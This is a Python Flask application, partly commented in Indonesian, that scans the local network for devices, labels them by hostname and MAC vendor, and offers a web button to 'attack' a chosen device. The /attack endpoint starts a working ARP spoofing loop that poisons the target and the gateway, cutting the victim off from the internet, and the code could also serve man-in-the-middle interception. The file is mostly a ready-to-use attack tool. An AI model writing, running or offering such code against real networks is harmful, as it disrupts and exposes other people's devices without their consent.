from flask import Flask, render_template, request, jsonify
from scapy.all import ARP, Ether, srp, send, conf, IP, UDP, NBNSQueryRequest
import threading
import time
import socket
import os
import subprocess
import asyncio
from mac_vendor_lookup import AsyncMacLookup

app = Flask(__name__)

# Inisialisasi MAC Lookup database
# Instantiating AsyncMacLookup loads the vendors file into memory.
async_mac_lookup = AsyncMacLookup()

def update_mac_db():
    try:
        print("[INFO] Updating MAC vendor database in background...")
        # Since update_vendors is async, we need a throwaway event loop to run it in this background thread
        asyncio.run(async_mac_lookup.update_vendors())
        print("[INFO] MAC vendor database updated.")
    except Exception as e:
        print("Warning: Could not update MAC vendor list.", e)

threading.Thread(target=update_mac_db, daemon=True).start()

# --- KONFIGURASI JARINGAN SEMENTARA ---
# These will be dynamically populated by functions
# Remove hardcoded conf.iface
# conf.iface will be auto-set by scapy or detected based on route

active_attacks = {}

def get_network_info():
    """Dynamically get the default gateway and active interface IP."""
    try:
        # scapy's conf.route.route('0.0.0.0') returns (iface_name, host_ip, gateway_ip)
        _, host_ip, gateway_ip = conf.route.route("0.0.0.0")
        
        # Ensure scapy uses the correct interface for sending packets
        # conf.route.route returns the interface name (or Scapy IFACE object) 
        # that handles the 0.0.0.0 route (default route)
        default_iface = conf.route.route("0.0.0.0")[0]
        conf.iface = default_iface
        
        return host_ip, gateway_ip
    except Exception as e:
        print(f"Error detecting network: {e}")
        return None, None

def get_local_ip_mac(host_ip):
    hostname = socket.gethostname()
    return {'ip': host_ip, 'mac': 'Host Anda (Laptop)', 'vendor': 'Local Host'}

def is_random_mac(mac):
    """Checks if a MAC address is a Locally Administered Address (LAA).
    This is typical for Android/iOS devices using Privacy/Random MAC mode.
    """
    try:
        # Get the first octet
        first_octet = int(mac.split('-')[0] if '-' in mac else mac.split(':')[0], 16)
        # Check the 'locally administered' bit (second least significant bit of first byte)
        # 1-6 are the ranges, but specifically if bit 1 (0x02) is set.
        return (first_octet & 0x02) == 0x02
    except:
        return False

def get_device_name(ip):
    """Tries to resolve device name via DNS and NetBIOS."""
    # 1. Try DNS/Hostname lookup
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        if hostname and not hostname.replace('.', '').isdigit():
            return hostname
    except:
        pass

    # 2. Try NetBIOS (NBNS) - Works for Windows and many Androids
    try:
        # Send a NetBIOS Name Query to the device
        # We use a broad QUESTION_NAME '*'
        pkt = IP(dst=ip)/UDP(sport=137, dport=137)/NBNSQueryRequest(QUESTION_NAME='*')
        ans = srp(pkt, timeout=0.5, verbose=False, retry=0)[0]
        if ans:
             # Extract name from response
             nb_name = ans[0][1].QUESTION_NAME.decode().strip()
             if nb_name:
                 return nb_name
    except:
        pass

    return None

def get_vendor(mac):
    try:
        if mac.lower() in ['ff-ff-ff-ff-ff-ff', 'ff:ff:ff:ff:ff:ff']:
            return 'Broadcast'
            
        if is_random_mac(mac):
            return 'Private Device (Android/iOS)'
            
        # MacLookup expects colons, windows arp returns dashes, normalize it:
        normalized_mac = mac.replace('-', ':')
        # Use asyncio.run to create a fresh loop for this worker thread and run the lookup
        vendor = asyncio.run(async_mac_lookup.lookup(normalized_mac))
        return vendor
    except Exception as e:
        # Fallback if lookup fails or database not ready
        return 'Unknown Brand'

def get_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        if ans: return ans[0][1].hwsrc
    except: return None
    return None

def spoof(target_ip, spoof_ip, target_mac):
    # Send packet to target instructing it that the spoof_ip (gateway) is at our MAC
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Broadcast alternative (more aggressive):
    # packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def spoof_loop(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    # We should act as a blackhole, meaning we tell the target we are the gateway,
    # but we DO NOT forward packets (unless IP forwarding is enabled at the OS level).
    # To drop internet, we shouldn't necessarily spoof the gateway back unless needed,
    # but doing both is common. The target sending packets to us is enough if we drop them.
    
    while active_attacks.get(target_ip):
        if target_mac and gateway_mac:
            # Tell target we are the gateway
            spoof(target_ip, gateway_ip, target_mac)
            # Tell gateway we are the target
            spoof(gateway_ip, target_ip, gateway_mac)
        # Send packets faster to combat the real router's ARP broadcasts
        time.sleep(1)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan', methods=['GET'])
def scan():
    if not conf.use_pcap:
        return jsonify({"error": "Npcap is missing or not working! Please install Npcap in WinPcap API-compatible mode to enable scanning."}), 500
        
    try:
        host_ip, gateway_ip = get_network_info()
        if not host_ip or not gateway_ip:
            return jsonify({"error": "Gagal mendeteksi gateway jaringan. Pastikan terkoneksi ke WiFi/LAN."}), 500
            
        # Extract subnet prefix (e.g., '192.168.1' from '192.168.1.X')
        subnet = ".".join(gateway_ip.split(".")[:3])
        
        def ping_all():
            for i in range(1, 255):
                os.system(f"ping -n 1 -w 50 {subnet}.{i} > nul")
        
        threading.Thread(target=ping_all).start()
        time.sleep(4)
        devices = [get_local_ip_mac(host_ip)]
        result = subprocess.check_output("arp -a", shell=True).decode()
        
        for line in result.splitlines():
            if "dynamic" in line or "static" in line:
                parts = line.split()
                if len(parts) >= 3:
                    ip = parts[0]
                    mac = parts[1]
                    if ip.startswith(subnet):
                        name = get_device_name(ip)
                        vendor = get_vendor(mac)
                        
                        # Smart Name logic: prioritize Hostname if available
                        full_identity = name if name else vendor
                        if name and vendor and vendor != 'Private Device (Android/iOS)' and vendor != 'Unknown Brand':
                            full_identity = f"{name} ({vendor})"
                        elif not name:
                            full_identity = vendor
                            
                        devices.append({'ip': ip, 'mac': mac, 'vendor': full_identity})
                        
        return jsonify(devices)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/attack', methods=['POST'])
def attack():
    if not conf.use_pcap:
        return jsonify({"status": "Error", "message": "Npcap is required to attack."}), 500
        
    data = request.json
    target_ip = data['ip']
    
    _, gateway_ip = get_network_info()
    if not gateway_ip:
        return jsonify({"status": "Error", "message": "Gagal mendapatkan Gateway IP."}), 500
        
    active_attacks[target_ip] = True
    threading.Thread(target=spoof_loop, args=(target_ip, gateway_ip), daemon=True).start()
    return jsonify({"status": "Attacking " + target_ip})

@app.route('/stop', methods=['POST'])
def stop():
    data = request.json
    target_ip = data['ip']
    active_attacks[target_ip] = False
    return jsonify({"status": "Stopped"})

if __name__ == '__main__':
    app.run(debug=True, port=5000)